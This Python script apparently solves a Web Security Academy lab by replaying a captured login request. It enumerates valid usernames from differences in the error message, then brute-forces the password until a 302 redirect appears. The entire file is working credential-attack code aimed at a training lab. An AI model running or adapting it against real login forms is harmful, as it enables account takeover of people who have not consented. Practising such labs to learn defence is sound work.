from fartlib import *

req = FartRequest("""
POST /login HTTP/1.1
Host: 0a8a005d034709a0c053451f00ce004c.web-security-academy.net
Cookie: session=a8zlI2nUiiLM6CASTYnkGzWb7PTrFsJ6
Content-Length: 26
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a8a005d034709a0c053451f00ce004c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8a005d034709a0c053451f00ce004c.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

username=uname&password=pwd
""")

response = HttpWorker(req.substitute(uname=usernames, pwd="a")) \
    .get_first(lambda resp: "Invalid username or password." not in resp.raw_response.text)

username = usernames[response.index]
print("Found username", username)

response = HttpWorker(req.substitute(uname=username, pwd=passwords)) \
    .get_first(lambda resp: resp.status_code == 302)

password = passwords[response.index]
print("Found creds", username, password)
